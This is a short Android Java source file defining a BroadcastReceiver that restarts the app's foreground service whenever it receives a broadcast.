package com.ot.grhq.client.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.ot.grhq.client.ForegroundService;
import com.ot.grhq.client.MainService;

public class ServiceTerminate extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        context.startService(new Intent(context, ForegroundService.class));
    }
}
